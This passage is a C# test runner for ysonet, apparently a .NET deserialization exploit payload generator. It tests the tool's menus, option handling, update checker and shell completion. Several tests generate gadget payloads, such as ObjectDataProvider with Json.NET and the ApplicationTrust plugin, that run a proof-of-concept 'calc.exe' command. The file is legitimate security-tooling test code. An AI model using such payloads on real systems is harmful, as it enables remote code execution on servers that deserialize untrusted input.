using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ysonet.Generators;
using ysonet.Helpers;
using ysonet.Helpers.Core;
using ysonet.Interactive;
using ysonet.Plugins;

namespace ysonet.Tests
{
    // Self-contained test runner. No external test framework, so there is no new
    // NuGet dependency (the dependency freshness policy stays satisfied). Each
    // Check reports pass/fail; the process exits non-zero if anything failed.
    internal class Tests
    {
        private static int _passed = 0;
        private static int _failed = 0;

        private static int Main(string[] args)
        {
            if (Environment.GetEnvironmentVariable("YSONET_DUMPUI") != null) { DumpUi(); return 0; }
            Run("Picker.Filter ranks exact, prefix, contains", PickerFilterRanking);
            Run("Picker.Filter empty query returns all", PickerFilterEmpty);
            Run("Picker.Filter no match returns empty", PickerFilterNoMatch);
            Run("OptionField introspects a gadget OptionSet", OptionFieldIntrospection);
            Run("OptionField flag vs value ToArgv", OptionFieldToArgv);
            Run("CommandEcho quotes and builds", CommandEchoBuild);
            Run("CommandEcho gadget tokens shape", CommandEchoGadgetTokens);
            Run("PayloadRunner.Encode base64/hex", EncodeFormats);
            Run("PayloadRunner.GenerateGadget is deterministic", GenerateDeterministic);
            Run("Plugin argv rebuild matches CLI output", PluginArgvRebuild);
            Run("Every global option is surfaced or excluded", OptionCompleteness);
            Run("CliListing lists gadgets, plugins, formatters, options", CliListingBasics);
            Run("CliListing narrows to a gadget's formatters and options", CliListingPerModule);
            Run("UpdateChecker.NormalizeVersion strips repo prefix and v", UpdateCheckerNormalize);
            Run("UpdateChecker.LooksLikeVersion accepts only dotted numerics", UpdateCheckerLooksLikeVersion);
            Run("UpdateChecker.CompareVersions is numeric and prefix-tolerant", UpdateCheckerCompares);
            Run("UpdateChecker.TryParseRelease reads tag/url and rejects junk", UpdateCheckerParsesRelease);
            Run("UpdateChecker.Check reports update/uptodate/ahead events", UpdateCheckerCheckEvents);
            Run("UpdateChecker.Check reports unreachable and unparseable errors", UpdateCheckerCheckErrors);
            Run("UpdateChecker.Check picks the release url and echoes current", UpdateCheckerCheckUrlAndCurrent);
            Run("PowerShell completion script covers every CLI option", CompletionScriptCoversOptions);
            Run("PowerShell completion script value lists match the tool", CompletionScriptValueLists);
            Run("Completion script is embedded in the exe", CompletionScriptEmbedded);
            Run("Completion profile block installs idempotently and uninstalls", CompletionProfileBlock);
            Run("Completion shell classifier recognizes shells", CompletionShellClassifier);
            Run("Completion policy classifier flags signing-required policies", CompletionPolicyClassifier);
            Run("Menu navigates with arrows and Enter", MenuNavigation);
            Run("Menu digit shortcut and Escape cancel", MenuDigitAndCancel);
            Run("Picker selects by typing and cancels on Esc", PickerShowSelectAndCancel);
            Run("Menu redraws in place in a real console", MenuRedrawsInPlace);
            Run("Menu shows numbers and a key hint", MenuShowsNumbersAndHint);
            Run("Wizard e2e builds the same payload as the core", WizardEndToEnd);
            Run("Wizard advanced options reach the payload", WizardAdvancedOptions);
            Run("Wizard writes to a file, not stdout", WizardOutputToFile);
            Run("Wizard cancel at the picker emits nothing", WizardCancelAtPicker);
            Run("Esc at a text prompt goes back, no payload", WizardEscAtTextPrompt);
            Run("Wizard plugin path matches the core", WizardPluginPath);
            Run("Gadgets declare their command-input type", CommandInputTypes);
            Run("Ignored-command gadget needs no -c and hides those fields", IgnoredCommandGadget);
            Run("Gadgets declare their variants", GadgetsDeclareVariants);
            Run("Variants can declare their own command-input type", VariantInputTypes);
            Run("Variant formatter opt-out narrows first-token, case-insensitive", VariantFormatterOptOutDataModel);
            Run("Affected gadgets opt variant 1 out of SoapFormatter (union kept)", VariantFormatterOptOutWiring);
            Run("Editor blocks a variant+formatter mismatch at generate", EditorBlocksVariantFormatterMismatch);
            Run("Guard rejects variant+formatter mismatch on the non-UI path", GuardBlocksVariantFormatterOnNonUiPath);
            Run("Option heuristics recover choices/default/required", OptionHeuristics);
            Run("Editor builds plugin fields with defaults and a gadget picker", EditorPluginFields);
            Run("Editor exposes actions and marks module-own options", EditorActionsAndOwnership);
            Run("Choice options are detected (modes, colon lists, numbered)", ChoiceDetection);
            Run("Bridged-chain setting offers bridge gadgets", BridgedChainChoices);
            Run("Switching variant resets a stale, wrong-type command", VariantSwitchResetsCommand);
            Run("Changed settings persist across modules; reset restores defaults", OptionsPersistAndReset);
            Run("A typed command persists across gadget switches (not only on generate)", CommandPersistsAcrossGadgets);
            Run("Shared settings carry from a gadget to a plugin", SettingsSharedGadgetToPlugin);
            Run("Themes apply and are named", ThemeApply);
            Run("Conditional plugin options are not marked required", ConditionalRequired);
            Run("ViewState missing-payload error names the options to set", ViewStateModeErrorIsActionable);
            Run("Informational plugin options (examples) are hidden from the editor", ExamplesHiddenFromEditor);
            Run("Plugin modes drive which settings show, are required, and are passed", PluginModesDriveOptions);
            Run("DotNetNuke modes select the payload mode and pass the right args", DotNetNukeModes);
            Run("Clipboard modes scope format vs xamlvariant per mode", ClipboardModes);
            Run("SharePoint modes select the CVE and scope its inner setting", SharePointModes);
            Run("A space sets an explicit empty string, distinct from unset", ExplicitEmptyStringViaSpace);
            Run("Interactive banner marks beta and shows the version", BannerShowsBetaAndVersion);
            Run("Show-command action prints the one-liner without generating", WizardShowCommand);
            Run("Generate and quit emits the payload and exits", WizardGenerateAndQuit);
            Run("Columns render in a virtual terminal (layout + per-cell highlight)", ColumnsRenderInVirtualTerminal);
            Run("Typing filters the module list by substring", ColumnFilterNarrowsModules);
            Run("Typing filters the settings list by substring", ColumnFilterNarrowsSettings);
            Run("Module info panel shows facts while choosing a module", ModuleInfoPanelShowsFacts);
            Run("FilterFields keeps substring matches and keeps order", FilterFieldsUnit);
            Run("Help/description text is shown sentence-cased", SentenceCasingUnit);
            Run("Every top menu screen renders in a virtual terminal", AllMenusRender);
            Run("Text editor pre-fills and appends on type (no wipe)", TextEditAppends);
            Run("Text editor caret moves and edits in place (Left/Home/Delete)", TextEditCaretEditing);
            Run("Text editor word ops (Ctrl+Backspace, Ctrl+Left)", TextEditWordOps);
            Run("Text editor wraps a long value in place across rows", TextEditWrapsInPlace);
            Run("A focused setting's full value shows in the footer for copying", FocusedValueInFooter);
            Run("LineEditBuffer inserts, deletes words, clears, and clamps the caret", LineEditBufferUnit);
            Run("Generate is blocked (not an exit) when required settings are empty", WizardBlocksMissingRequired);
            Run("Blocked report enumerates every missing required setting", BlockedReportEnumeratesMissing);
            Run("Blocked report shows the command's expected input and example", BlockedReportShowsCommandExample);
            Run("Home/End jump to first/last setting in the columns", ColumnsHomeEndNav);
            Run("Picker Home/End jump to first/last match", PickerHomeEnd);
            Run("Wizard remembers the last command", WizardRemembersLastCommand);
            Run("Run-all-formatters survives file/url gadgets", WizardRunAllFormatters);
            Run("Run-all-formatters saves payloads to a folder", WizardRunAllFormattersToFolder);
            Run("Clipboard plugin exposes the wpfxaml mode options", ClipboardWpfXamlOptions);
            Run("Clipboard payloads actually trigger (winforms + wpfxaml variants)", ClipboardPayloadsTrigger);
            Run("Restrictive XAML load blocks the ObjectDataProvider gadget", RestrictiveXamlBlocksGadget);
            Run("Option help renders without hanging for every plugin and gadget", OptionHelpNeverHangs);
            Run("SoftBreak wraps over-long help tokens (NDesk hang guard)", SoftBreakWrapsLongTokens);
            Run("XmlMinifier strips soap encodingStyle without O(n^2) backtracking", XmlMinifierEncodingStyle);
            Run("XmlMinifier scales linearly on a big inline-assembly payload", XmlMinifierScalesOnBigPayload);
            Run("XmlMinifier dirty-match pass scales on a big hex attribute", XmlMinifierDirtyMatchScalesOnHexAttribute);
            Run("XmlMinifier dirty-match pass output is unchanged by the guard+lookbehind fix", XmlMinifierDirtyMatchOutputUnchanged);
            Run("XmlMinifier trims the leading space of a generic type's outer assembly", XmlMinifierTrimsLeadingSpaceInGenericTypeName);
            Run("XmlMinifier removes a namespace orphaned by a discardable regex (guarded)", XmlMinifierRemovesNamespaceOrphanedByDiscard);
            Run("Byte-array encoder emits the compact bare <Byte> tag", ByteArrayEncoderEmitsBareTag);
            Run("GetterSettingsPropertyValue Xaml uses the compact byte array", GspvXamlUsesCompactByteArray);
            Run("DataSetOldBehaviourFromFile --compressed shrinks via a GZip payload chain", DataSetFromFileCompressedIsSmaller);
            Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
            Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);

            // FULL tier (opt-in): the exhaustive combination suite. It is slower and
            // flashes many self-closing cmd windows / binds loopback sockets, so it
            // never runs on a normal Debug build. Enable it with the --full arg or the
            // YSONET_FULL_TESTS env var (the post-build <Exec> inherits the env var).
            bool full = Array.IndexOf(args, "--full") >= 0
                || Environment.GetEnvironmentVariable("YSONET_FULL_TESTS") != null;
            if (full)
            {
                Console.Error.WriteLine();
                Console.Error.WriteLine("---- FULL tier (exhaustive combination suite) ----");
                Run("Every gadget x formatter x variant generates (x minify)", GadgetFullMatrixGenerates);
                Run("Payloads fire into test-owned sinks (marker/listener/tempdir/self-cs)", PayloadsFireIntoTestSinks);
                Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
                Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
                Run("Every plugin mode/CVE/inner-gadget generates (x minify)", PluginFullMatrixGenerates);
            }

            Console.Error.WriteLine();
            Console.Error.WriteLine("Passed: " + _passed + "  Failed: " + _failed);
            return _failed == 0 ? 0 : 1;
        }

        // ---- individual tests --------------------------------------------------

        private static void PickerFilterRanking()
        {
            var items = new List<string> { "Beta", "AlphaBeta", "Alpha" };
            var r = Picker.Filter(items, "alpha");
            AssertEqual(2, r.Count, "count");
            AssertEqual("Alpha", r[0], "exact first");
            AssertEqual("AlphaBeta", r[1], "prefix/contains second");
        }

        private static void PickerFilterEmpty()
        {
            var items = new List<string> { "a", "b", "c" };
            var r = Picker.Filter(items, "");
            AssertEqual(3, r.Count, "returns all");
        }

        private static void PickerFilterNoMatch()
        {
            var items = new List<string> { "a", "b" };
            var r = Picker.Filter(items, "zzz");
            AssertEqual(0, r.Count, "no match");
        }

        private static void OptionFieldIntrospection()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("ObjectDataProvider");
            AssertTrue(g != null, "gadget loads");
            var fields = OptionField.FromOptionSet(g.Options());
            // ObjectDataProvider has var|variant= and xamlurl=
            AssertEqual(2, fields.Count, "two options");
            OptionField variant = FindField(fields, "variant");
            OptionField xamlurl = FindField(fields, "xamlurl");
            AssertTrue(variant != null, "variant field present");
            AssertTrue(xamlurl != null, "xamlurl field present");
            AssertTrue(variant.TakesValue, "variant takes a value");
            // var|variant has no single-char alias, so ShortName is null.
            AssertTrue(variant.ShortName == null, "variant has no single-char short name");
            AssertTrue(!string.IsNullOrEmpty(variant.Description), "variant has help text");

            // A single-char alias is captured as ShortName.
            OptionSet withShort = new OptionSet { { "p|plugin=", "the plugin", v => { } } };
            OptionField pf = FindField(OptionField.FromOptionSet(withShort), "plugin");
            AssertEqual("p", pf.ShortName, "single-char short name captured");
        }

        private static void OptionFieldToArgv()
        {
            bool flag = false;
            string val = null;
            OptionSet set = new OptionSet
            {
                { "minify", "a flag", v => flag = v != null },
                { "var|variant=", "a value", v => val = v }
            };
            var fields = OptionField.FromOptionSet(set);

            OptionField f = FindField(fields, "minify");
            OptionField v2 = FindField(fields, "variant");

            AssertTrue(f.IsFlag, "minify is a flag");
            AssertEqual(0, f.ToArgv().Count, "unset flag emits nothing");
            f.Value = "true";
            var flagArgv = f.ToArgv();
            AssertEqual(1, flagArgv.Count, "set flag emits one token");
            AssertEqual("--minify", flagArgv[0], "flag token");

            AssertEqual(0, v2.ToArgv().Count, "unset value emits nothing");
            v2.Value = "2";
            var valArgv = v2.ToArgv();
            AssertEqual(2, valArgv.Count, "set value emits two tokens");
            AssertEqual("--variant", valArgv[0], "value flag");
            AssertEqual("2", valArgv[1], "value");
        }

        private static void CommandEchoBuild()
        {
            AssertEqual("plain", CommandEcho.Quote("plain"), "no quote needed");
            AssertEqual("\"a b\"", CommandEcho.Quote("a b"), "space quoted");
            AssertEqual("\"\"", CommandEcho.Quote(""), "empty quoted");
            var tokens = new List<string> { "-g", "ObjectDataProvider", "-c", "a b" };
            string line = CommandEcho.Build(tokens);
            AssertEqual("ysonet.exe -g ObjectDataProvider -c \"a b\"", line, "built line");
        }

        private static void CommandEchoGadgetTokens()
        {
            var tokens = CommandEcho.GadgetTokens(
                "ObjectDataProvider", "Json.NET", "calc.exe",
                false, false, "", "", "", false, false, false, false, null);
            string line = CommandEcho.Build(tokens);
            AssertTrue(line.StartsWith("ysonet.exe -g ObjectDataProvider -f Json.NET -c calc.exe"),
                "gadget command shape: " + line);
        }

        private static void EncodeFormats()
        {
            int len;
            byte[] b64 = PayloadRunner.Encode("abc", "base64", out len);
            AssertEqual("YWJj", Encoding.ASCII.GetString(b64), "base64 of abc");

            byte[] hex = PayloadRunner.Encode(new byte[] { 0x01, 0xff }, "hex", out len);
            AssertEqual("01FF", Encoding.ASCII.GetString(hex), "hex of bytes");

            byte[] raw = PayloadRunner.Encode("hello", "raw", out len);
            AssertEqual("hello", Encoding.UTF8.GetString(raw), "raw string");
        }

        private static void GenerateDeterministic()
        {
            byte[] a = GenerateOdpJson("calc.exe");
            byte[] b = GenerateOdpJson("calc.exe");
            AssertTrue(a != null && a.Length > 0, "payload produced");
            AssertTrue(BytesEqual(a, b), "same inputs give same bytes");
        }

        private static void PluginArgvRebuild()
        {
            // Rebuild argv the way the wizard does and confirm the plugin runs.
            var argv = new List<string> { "-p", "ApplicationTrust", "-c", "calc.exe" };
            RunResult r = PayloadRunner.RunPlugin("ApplicationTrust", argv.ToArray());
            AssertTrue(r.Success, "plugin ran: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "plugin produced output");
        }

        private static void OptionCompleteness()
        {
            var fields = OptionField.FromOptionSet(ysonet.Program.options);
            AssertTrue(fields.Count > 0, "global options readable");

            var covered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (string s in Wizard.SurfacedGlobalOptions) covered.Add(s);
            foreach (string s in Wizard.NonPayloadGlobalOptions) covered.Add(s);

            foreach (OptionField f in fields)
            {
                AssertTrue(covered.Contains(f.Name),
                    "global option '" + f.Name + "' must be surfaced or explicitly excluded");
            }
        }

        private static void CliListingBasics()
        {
            var gadgets = CliListing.Gadgets();
            var plugins = CliListing.Plugins();
            var formatters = CliListing.Formatters();
            var options = CliListing.OptionTokens(ysonet.Program.options);

            AssertTrue(gadgets.Count > 10, "several gadgets listed");
            AssertTrue(plugins.Count > 5, "several plugins listed");
            AssertTrue(formatters.Count > 5, "several formatters listed");
            AssertTrue(options.Count > 10, "several option tokens listed");

            // "Generic" is an internal placeholder and must never be offered.
            AssertTrue(!gadgets.Contains("Generic"), "gadgets exclude Generic");
            AssertTrue(!plugins.Contains("Generic"), "plugins exclude Generic");

            // A few well-known values must be present.
            AssertTrue(gadgets.Contains("ObjectDataProvider"), "ObjectDataProvider listed");
            AssertTrue(formatters.Contains("BinaryFormatter"), "BinaryFormatter listed");
            AssertTrue(formatters.Contains("Json.NET"), "Json.NET listed (dot kept)");
            // Variant annotations must be cleaned off in the global formatter list.
            AssertTrue(!formatters.Contains("Xaml (4)"), "no annotated formatter names");
            AssertTrue(formatters.Contains("Xaml"), "Xaml listed cleanly");

            AssertTrue(options.Contains("-g") && options.Contains("--gadget"), "gadget option tokens present");
            AssertTrue(options.Contains("--list"), "list option token present");
        }

        private static void CliListingPerModule()
        {
            var odpFormatters = CliListing.GadgetFormatters("ObjectDataProvider");
            AssertTrue(odpFormatters.Count > 3, "gadget reports its formatters");
            AssertTrue(odpFormatters.Contains("Json.NET"), "ObjectDataProvider supports Json.NET");

            var odpOptions = CliListing.GadgetOptions("ObjectDataProvider");
            AssertTrue(odpOptions.Contains("--variant"), "ObjectDataProvider exposes --variant");
            AssertTrue(odpOptions.Contains("--xamlurl"), "ObjectDataProvider exposes --xamlurl");

            var vsOptions = CliListing.PluginOptions("ViewState");
            AssertTrue(vsOptions.Count > 5, "ViewState plugin exposes options");
            AssertTrue(vsOptions.Contains("-g") || vsOptions.Contains("--gadget"), "ViewState exposes a gadget option");

            // Unknown names return empty, not an exception.
            AssertEqual(0, CliListing.GadgetFormatters("NoSuchGadget").Count, "unknown gadget -> empty");
            AssertEqual(0, CliListing.PluginOptions("NoSuchPlugin").Count, "unknown plugin -> empty");
        }

        // Drift guard: every top-level CLI option the tool defines must be known
        // to the PowerShell completion script, so adding an option to Program.cs
        // without updating the script fails the build.
        private static void UpdateCheckerNormalize()
        {
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("ysonet/v2026.7.4"), "repo prefix + v stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("v2026.7.4"), "leading v stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("V2026.7.4"), "uppercase V stripped");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("2026.7.4"), "already bare is unchanged");
            AssertEqual("2026.7.4", UpdateChecker.NormalizeVersion("  ysonet/v2026.7.4  "), "surrounding space trimmed");
            AssertEqual("", UpdateChecker.NormalizeVersion(""), "empty stays empty");
            AssertEqual("", UpdateChecker.NormalizeVersion(null), "null is safe");
        }

        private static void UpdateCheckerLooksLikeVersion()
        {
            AssertTrue(UpdateChecker.LooksLikeVersion("2026"), "single number is a version");
            AssertTrue(UpdateChecker.LooksLikeVersion("2026.7"), "two parts is a version");
            AssertTrue(UpdateChecker.LooksLikeVersion("2026.7.4"), "three parts is a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("nightly"), "a word is not a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("2026.7.4-rc1"), "a pre-release suffix is not a plain version");
            AssertTrue(!UpdateChecker.LooksLikeVersion("v2026.7.4"), "the v must be normalized off first");
            AssertTrue(!UpdateChecker.LooksLikeVersion(""), "empty is not a version");
            AssertTrue(!UpdateChecker.LooksLikeVersion(null), "null is not a version");
        }

        private static void UpdateCheckerCompares()
        {
            // A newer latest at any position returns > 0.
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2026.7.5") > 0, "patch bump is newer");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2026.8.1") > 0, "month bump is newer");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.4", "v2027.1.1") > 0, "year bump is newer");
            // Equal, tolerating the repo tag prefix and a missing trailing part.
            AssertEqual(0, UpdateChecker.CompareVersions("v2026.7.4", "ysonet/v2026.7.4"), "same version, tag prefix");
            AssertEqual(0, UpdateChecker.CompareVersions("v2026.7", "v2026.7.0"), "missing part counts as 0");
            AssertEqual(0, UpdateChecker.CompareVersions("", ""), "two empties are equal");
            // Current newer returns < 0, and the compare must be numeric not lexical.
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.5", "v2026.7.4") < 0, "older latest is not an update");
            AssertTrue(UpdateChecker.CompareVersions("v2026.7.10", "v2026.7.9") < 0, "10 is newer than 9 (numeric)");
            // Unknown current (empty) sorts oldest, so any real release looks newer.
            AssertTrue(UpdateChecker.CompareVersions("", "v2026.7.4") > 0, "unknown current is treated as oldest");
        }

        private static void UpdateCheckerParsesRelease()
        {
            string tag, url;
            string json = "{\"tag_name\":\"ysonet/v2026.7.5\",\"html_url\":\"https://example/releases/v2026.7.5\"}";
            AssertTrue(UpdateChecker.TryParseRelease(json, out tag, out url), "parses valid release json");
            AssertEqual("ysonet/v2026.7.5", tag, "tag_name read");
            AssertEqual("https://example/releases/v2026.7.5", url, "html_url read");
            AssertEqual("2026.7.5", UpdateChecker.NormalizeVersion(tag), "tag normalized to bare version");

            // A tag with no html_url still parses; url comes back null.
            AssertTrue(UpdateChecker.TryParseRelease("{\"tag_name\":\"ysonet/v1.2.3\"}", out tag, out url), "tag-only parses");
            AssertEqual("ysonet/v1.2.3", tag, "tag read without url");
            AssertTrue(url == null, "url is null when absent");

            // Rejections: no tag, non-json, empty, null.
            AssertTrue(!UpdateChecker.TryParseRelease("{\"html_url\":\"x\"}", out tag, out url), "rejects json with no tag");
            AssertTrue(!UpdateChecker.TryParseRelease("not json", out tag, out url), "rejects non-json");
            AssertTrue(!UpdateChecker.TryParseRelease("", out tag, out url), "rejects empty");
            AssertTrue(!UpdateChecker.TryParseRelease(null, out tag, out url), "rejects null");
        }

        private static void UpdateCheckerCheckEvents()
        {
            Func<string, string> latest79 = url =>
                "{\"tag_name\":\"ysonet/v2026.7.9\",\"html_url\":\"https://example/latest\"}";

            // A newer release is available.
            var up = UpdateChecker.Check("v2026.7.4", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpdateAvailable, up.Status, "newer -> UpdateAvailable");
            AssertTrue(up.Succeeded, "update-available is a completed check");
            AssertTrue(up.UpdateAvailable, "UpdateAvailable convenience prop is true");
            AssertEqual("v2026.7.9", up.LatestVersion, "latest normalized to vX");

            // Running the latest.
            var same = UpdateChecker.Check("v2026.7.9", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpToDate, same.Status, "equal -> UpToDate");
            AssertTrue(same.Succeeded && !same.UpdateAvailable, "up-to-date is not an update");

            // Local build ahead of the latest release (the "time machine" case).
            var ahead = UpdateChecker.Check("v2026.8.1", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.Ahead, ahead.Status, "current newer -> Ahead");
            AssertTrue(ahead.Succeeded && !ahead.UpdateAvailable, "ahead is a completed check, not an update");

            // Unknown current version -> any release looks newer.
            var unknown = UpdateChecker.Check("", latest79);
            AssertEqual(UpdateChecker.UpdateStatus.UpdateAvailable, unknown.Status, "unknown current -> update available");

            // A tag without the repo prefix is compared just the same.
            Func<string, string> bareTag = url => "{\"tag_name\":\"v2026.7.9\"}";
            AssertEqual(UpdateChecker.UpdateStatus.UpToDate, UpdateChecker.Check("v2026.7.9", bareTag).Status, "bare tag compares");
        }

        private static void UpdateCheckerCheckErrors()
        {
            // Network failure (timeout, offline, HTTP error) is captured, never thrown.
            Func<string, string> boom = url => { throw new Exception("timed out"); };
            var unreachable = UpdateChecker.Check("v2026.7.4", boom);
            AssertEqual(UpdateChecker.UpdateStatus.Unreachable, unreachable.Status, "throw -> Unreachable");
            AssertTrue(!unreachable.Succeeded, "unreachable is not a successful check");
            AssertTrue(unreachable.Error != null && unreachable.Error.Contains("timed out"), "error carries the reason");

            // A null fetcher is treated as unreachable, not a crash.
            var noFetch = UpdateChecker.Check("v2026.7.4", null);
            AssertEqual(UpdateChecker.UpdateStatus.Unreachable, noFetch.Status, "null fetch -> Unreachable");

            // Reached GitHub but the body is not a release object.
            var junk = UpdateChecker.Check("v2026.7.4", url => "<html>nope</html>");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, junk.Status, "non-release body -> Unparseable");
            AssertTrue(!junk.Succeeded && !string.IsNullOrEmpty(junk.Error), "unparseable is a failure with a message");

            // An empty body.
            var empty = UpdateChecker.Check("v2026.7.4", url => "");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, empty.Status, "empty body -> Unparseable");

            // A tag present but not a recognizable version (release format changed).
            var weird = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"nightly\"}");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, weird.Status, "unrecognized tag -> Unparseable");
            AssertEqual("nightly", weird.LatestVersion, "raw tag kept for display");

            // A pre-release suffix cannot be compared safely -> Unparseable.
            var rc = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.4-rc1\"}");
            AssertEqual(UpdateChecker.UpdateStatus.Unparseable, rc.Status, "pre-release suffix -> Unparseable");
        }

        private static void UpdateCheckerCheckUrlAndCurrent()
        {
            // The API html_url is used when present.
            var withUrl = UpdateChecker.Check("v2026.7.4",
                url => "{\"tag_name\":\"ysonet/v2026.7.9\",\"html_url\":\"https://example/rel\"}");
            AssertEqual("https://example/rel", withUrl.ReleaseUrl, "html_url used when present");

            // Falls back to the releases page when the API gives no html_url.
            var noUrl = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.9\"}");
            AssertEqual(UpdateChecker.ReleasesPageUrl, noUrl.ReleaseUrl, "fallback url when html_url absent");

            // Error paths keep the fallback link so the user always has somewhere to go.
            var boom = UpdateChecker.Check("v2026.7.4", url => { throw new Exception("x"); });
            AssertEqual(UpdateChecker.ReleasesPageUrl, boom.ReleaseUrl, "unreachable keeps the fallback link");
            var junk = UpdateChecker.Check("v2026.7.4", url => "not json");
            AssertEqual(UpdateChecker.ReleasesPageUrl, junk.ReleaseUrl, "unparseable keeps the fallback link");

            // The current version is echoed back in the result for display.
            var r = UpdateChecker.Check("v2026.7.4", url => "{\"tag_name\":\"ysonet/v2026.7.4\"}");
            AssertEqual("v2026.7.4", r.CurrentVersion, "current version preserved");
        }

        private static void CompletionScriptCoversOptions()
        {
            string script = ReadCompletionScript();

            // Dev-only options intentionally left out of completion.
            var omitted = new HashSet<string>(StringComparer.Ordinal) { "--runmytest" };

            foreach (string token in CliListing.OptionTokens(ysonet.Program.options))
            {
                if (omitted.Contains(token))
                    continue;
                // The script lists tokens as quoted literals, e.g. '--gadget'.
                AssertTrue(script.Contains("'" + token + "'"),
                    "completion script must know option '" + token + "' (add it to tools/completions/ysonet.ps1)");
            }
        }

        // Drift guard: the script must read its value lists live from `--list`
        // (not hardcode them), and its --list category set must match the tool.
        private static void CompletionScriptValueLists()
        {
            string script = ReadCompletionScript();

            AssertTrue(script.Contains("--list"), "script drives value lists via --list");

            foreach (string category in CliListing.ListCategories)
            {
                AssertTrue(script.Contains("'" + category + "'"),
                    "script must reference --list category '" + category + "'");
            }
        }

        private static void CompletionScriptEmbedded()
        {
            string s = CompletionCommand.LoadPowerShellScript();
            AssertTrue(!string.IsNullOrEmpty(s), "embedded completion script present");
            AssertTrue(s.Contains("Register-ArgumentCompleter"), "script registers a completer");
            AssertTrue(s.Contains("--list"), "embedded script drives values via --list");
        }

        private static void CompletionProfileBlock()
        {
            string exe = @"C:\tools\ysonet.exe";

            // Insert into an empty profile.
            string t0 = CompletionCommand.AddOrUpdateBlock("", exe);
            AssertTrue(t0.Contains("$env:YSONET_EXE = 'C:\\tools\\ysonet.exe'"), "block sets exe path");
            AssertTrue(t0.Contains("completion powershell"), "block loads the script");

            // Installing again with the same exe is a no-op.
            string t1 = CompletionCommand.AddOrUpdateBlock(t0, exe);
            AssertEqual(t0, t1, "install is idempotent");

            // A different exe path replaces in place, leaving a single block.
            string t2 = CompletionCommand.AddOrUpdateBlock(t0, @"D:\ysonet.exe");
            AssertEqual(1, CountOccurrences(t2, "YSONET_EXE"), "only one managed block after update");
            AssertTrue(t2.Contains(@"D:\ysonet.exe"), "block refreshed to new exe path");

            // Surrounding profile content survives install and uninstall.
            string user = "Set-Alias ll Get-ChildItem" + Environment.NewLine;
            string withBlock = CompletionCommand.AddOrUpdateBlock(user, exe);
            AssertTrue(withBlock.Contains("Set-Alias ll Get-ChildItem"), "user content kept on install");

            string removed = CompletionCommand.RemoveBlock(withBlock);
            AssertTrue(removed.Contains("Set-Alias ll Get-ChildItem"), "user content kept on uninstall");
            AssertTrue(!removed.Contains("YSONET_EXE"), "managed block gone after uninstall");

            // When our block is the whole profile, removal leaves nothing, so
            // uninstall deletes the file instead of leaving an empty one.
            AssertTrue(string.IsNullOrWhiteSpace(CompletionCommand.RemoveBlock(t0)),
                "block-only profile becomes empty on uninstall");
        }

        private static void CompletionPolicyClassifier()
        {
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("AllSigned"), "AllSigned blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile("Restricted"), "Restricted blocks");
            AssertTrue(CompletionCommand.PolicyBlocksUnsignedProfile(" allsigned "), "case/space insensitive");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("RemoteSigned"), "RemoteSigned allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Bypass"), "Bypass allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile("Unrestricted"), "Unrestricted allows");
            AssertTrue(!CompletionCommand.PolicyBlocksUnsignedProfile(""), "empty is not a block");
        }

        private static void CompletionShellClassifier()
        {
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh"), "pwsh");
            AssertEqual(CompletionCommand.ShellKind.PowerShellCore, CompletionCommand.ClassifyShell("pwsh.exe"), "pwsh.exe");
            AssertEqual(CompletionCommand.ShellKind.WindowsPowerShell, CompletionCommand.ClassifyShell("powershell"), "powershell");
            AssertEqual(CompletionCommand.ShellKind.Cmd, CompletionCommand.ClassifyShell("cmd"), "cmd");
            AssertEqual(CompletionCommand.ShellKind.Posix, CompletionCommand.ClassifyShell("bash"), "bash");
            AssertEqual(CompletionCommand.ShellKind.Unknown, CompletionCommand.ClassifyShell("notepad"), "unknown app");
        }

        private static int CountOccurrences(string haystack, string needle)
        {
            int count = 0, i = 0;
            while ((i = haystack.IndexOf(needle, i, StringComparison.Ordinal)) >= 0)
            {
                count++;
                i += needle.Length;
            }
            return count;
        }

        // Locate tools/completions/ysonet.ps1 by walking up from the test binary,
        // so no absolute/machine path is baked in.
        private static string ReadCompletionScript()
        {
            string rel = Path.Combine("tools", "completions", "ysonet.ps1");
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null)
            {
                string candidate = Path.Combine(dir.FullName, rel);
                if (File.Exists(candidate))
                    return File.ReadAllText(candidate);
                dir = dir.Parent;
            }
            throw new Exception("could not locate " + rel + " above " + AppDomain.CurrentDomain.BaseDirectory);
        }

        private static void WizardEndToEnd()
        {
            // Drive the editor to build ObjectDataProvider + Json.NET + calc.exe.
            // The command defaults to calc.exe, so only the formatter is changed,
